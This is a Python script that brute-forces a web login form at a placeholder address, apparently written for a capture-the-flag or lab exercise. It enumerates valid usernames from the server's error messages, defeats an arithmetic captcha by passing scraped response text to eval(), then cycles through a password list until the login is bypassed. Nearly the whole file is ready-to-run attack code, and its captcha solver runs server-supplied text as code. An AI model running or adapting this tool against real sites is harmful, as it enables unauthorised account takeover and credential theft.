import re
import requests
from tqdm import tqdm

session = requests.session()
url = "http://<ip>/login"


# solve captcha
def solve_captcha(captcha):
    try:
        captcha_pattern = re.compile(r'(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?')
        find_captcha = captcha_pattern.findall(captcha)
        return eval(' '.join(find_captcha))
    except Exception as e:
        raise Exception(f"\rCaptcha error: {e}")

#brute force username 
def brute_force_username(payload):
    try:
        response = session.post(url=url,data=payload)
        return response.text
    except Exception as e:
        raise Exception(f"\rUsername brute force error: {e}")

# brute force password aggains found username
def brute_force_pass_againt_username(payload):
    try:
        response = session.post(url=url,data=payload)
        return response.text
    except Exception as e:
        raise Exception(f"\rPassword brute force error: {e}")

def brute_main():
    try:
        # get list or passwords and usernames
        usernames= open('usernames.txt','r').read().splitlines()
        passwords= open('passwords.txt','r').read().splitlines()

        # test payload 
        # won't use the username anyways 
        payload = {'username':'admin','password':'admin'}

        # send initial test payload
        # response = brute_force_username(payload=payload)
        
        # if it is a first request it might print invalid user so we start testing usernames
        for i in tqdm(range(len(usernames))):
            # update username
            payload['username'] = usernames[i]
            # now make request with updated user
            print(f'\r[*] Brute forcing {usernames[i]} with {payload["password"]}')
            response = brute_force_username(payload=payload)

            # check captcha
            if 'Captcha enabled' in response:
                captcha_result = solve_captcha(response)
                # update payload with captch                    
                payload["captcha"] = captcha_result 

            # send response again 
            response = brute_force_username(payload=payload)
            # check if username is found
            if 'The user' not in response and 'does not exist' not in response:
                print(f'\rHurray username cracked, User: {usernames[i]}')
                # update payload with correct user name
                payload['username'] = usernames[i]
                # solve capture
                payload['captcha'] = captcha_result
                passwords
                for j in tqdm(range(len(passwords))):
                    # now crack the pass
                    payload['password'] = passwords[j]
                    # solve capture
                    captcha_result = solve_captcha(response)
                    payload['captcha'] = captcha_result
                    print(f'\r[**] Brute forcing {passwords[j]} against {usernames[i]}')
                    response = brute_force_pass_againt_username(payload=payload)
                    if 'Invalid password for user' not in response:
                        print(response)
                        print(f"\rHurray, You have bypassed the login \n username: {usernames[i]} \n password: {passwords[j]}")
                        exit()

    except Exception as e:
        raise Exception(f"\rBrute force error: {e}")

def main():
    print(f"[*] Brute forcing started")
    brute_main()
    

if __name__ == '__main__':
    main()